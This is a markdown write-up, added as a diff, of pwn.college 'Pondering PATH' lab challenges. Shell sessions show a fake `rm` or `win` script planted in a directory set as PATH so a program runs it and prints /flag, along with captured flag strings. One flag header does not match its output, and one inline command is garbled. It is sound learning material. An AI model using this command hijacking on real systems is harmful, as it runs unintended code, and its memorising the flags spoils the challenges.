@@ -1,0 +1,132 @@
+# Pondering PATH
+
+## The PATH Variable
+
+### Solve
+
+**Flag:** `pwn.college{8trRARgUfBRlfyAdOhiXmpdtrDx.QX2cDM1wSO5EzNzEzW}`
+
+I had to prevent `/challenge/run` from accessing `rm`, so i set the PATH to "", and then ran the chall, to get the flag.
+
+```
+hacker@path~the-path-variable:~$ PATH=""
+hacker@path~the-path-variable:~$ /challenge/run
+Trying to remove /flag...
+/challenge/run: line 4: rm: No such file or directory
+The flag is still there! I might as well give it to you!
+pwn.college{8trRARgUfBRlfyAdOhiXmpdtrDx.QX2cDM1wSO5EzNzEzW}
+hacker@path~the-path-variable:~$
+```
+
+### New Learnings
+
+setting the `PATH` variable to an empty string disables command lookups, which can prevent programs from finding and executing certain commands, effectively blocking their actions and protecting files from deletion
+
+---
+
+## Setting PATH
+
+### Solve
+
+**Flag:** `pwn.college{wl-DpylTN5OjBejQ3OCbvPO8N4n.0lN4IDOxwSO5EzNzEzW}`
+
+We were supposed to set `/challenge/more_commands` to the PATH as the chall file ran this command by its bare name, therefore i used the following commands to get the flag.
+
+```
+hacker@path~setting-path:~$ PATH="/challenge/more_commands/"
+hacker@path~setting-path:~$ /challenge/run
+Invoking 'win'....
+Congratulations! You properly set the flag and 'win' has launched!
+pwn.college{QdTwIlaeC_1oVJBAUxReoivFFx8.QX1cjM1wSO5EzNzEzW}
+hacker@path~setting-path:~$
+
+```
+
+### New Learnings
+
+by customizing the `PATH` variable to include a specific directory, we can control which executables are found and run by a program, allowing us to redirect command execution to our own scripts or binaries
+
+---
+
+## Finding Commands
+
+### Solve
+
+**Flag:** `pwn.college{AsI6eQRFsA8pQDdg9UiAfjJw0WK.01NzEzNxwSO5EzNzEzW}`
+
+Had to find the path for the flag, which was the same as that of win,  so i ran `which win` and got the directory for the flag, then i ran `cat /challenge/paths/4001/fla/challenge/paths/4001/flag` to get the flag.
+
+```
+hacker@path~finding-commands:~$ which win
+/challenge/paths/4001/win
+hacker@path~finding-commands:~$ cat /challenge/paths/4001/flag
+pwn.college{AsI6eQRFsA8pQDdg9UiAfjJw0WK.01NzEzNxwSO5EzNzEzW}
+hacker@path~finding-commands:~$
+```
+
+### New Learnings
+
+Using tools like `which` help us locate the full path of executables, making it easier to find hidden files or commands in CTF challenges and understand how programs resolve command names
+
+---
+
+## Adding Commands
+
+### Solve
+
+**Flag:** `pwn.college{4yVj7ffpYfVNSFiTFrWd_yhk2bi.QX2cjM1wSO5EzNzEzW}`
+
+In this challenge, we were asked to make a shell script called win, add its location to the PATH, and enable /challenge/run to find it.
+So, i made a new dir `/tmp/mebin`, then wrote a shell script using `echo -e '#!/bin/sh\n/bin/cat /flag' > /tmp/mebin/win`, then i made win executable and finally ran the /challenge/run file and was able to get the flag.
+
+
+```
+hacker@path~adding-commands:~$ mkdir -p /tmp/mebin
+hacker@path~adding-commands:~$ echo -e '#!/bin/sh\n/bin/cat /flag' > /tmp/mebin/win
+hacker@path~adding-commands:~$ chmod +x /tmp/mebin/win
+hacker@path~adding-commands:~$ PATH=/tmp/mebin
+hacker@path~adding-commands:~$ /challenge/run
+Invoking 'win'....
+pwn.college{4yVj7ffpYfVNSFiTFrWd_yhk2bi.QX2cjM1wSO5EzNzEzW}
+hacker@path~adding-commands:~$
+```
+
+
+### New Learnings
+
+Creating custom executables in a directory and adding that directory to `PATH` lets us inject our own code into a program's workflow, a technique often used for privilege escalation or command hijacking in security testing
+
+
+---
+
+
+## Hijacking Commands
+
+### Solve
+
+**Flag:** `pwn.college{oQnlOd8DdcBA2pAwqVy1dSrcxDv.QX3cjM1wSO5EzNzEzW}`
+
+In this challenge, /challenge/run was performing `rm` on the flag file, so just like the last question, i created my own dir, where i created a fake `rm` cmd, which instead of deleting the flag, performs cat on it. Then i set the path to my dir, and ran /challenge/run and was able to get the flag.
+
+
+```
+hacker@path~hijacking-commands:~$ mkdir /tmp/mybin
+hacker@path~hijacking-commands:~$ echo -e '#!/bin/sh\n/bin/cat /flag' > /tmp/mybin/rm
+hacker@path~hijacking-commands:~$ chmod +x /tmp/mybin/rm
+hacker@path~hijacking-commands:~$ PATH="/tmp/mybin"
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+pwn.college{oQnlOd8DdcBA2pAwqVy1dSrcxDv.QX3cjM1wSO5EzNzEzW}
+hacker@path~hijacking-commands:~$
+
+```
+
+
+### New Learnings
+
+We can hijack system commands by placing fake versions in a directory listed first in `PATH`, allowing us to intercept and alter the behavior of critical commands like `rm`—a common method for exploiting insecure command execution in CTFs
+
+---
+
+# END
+
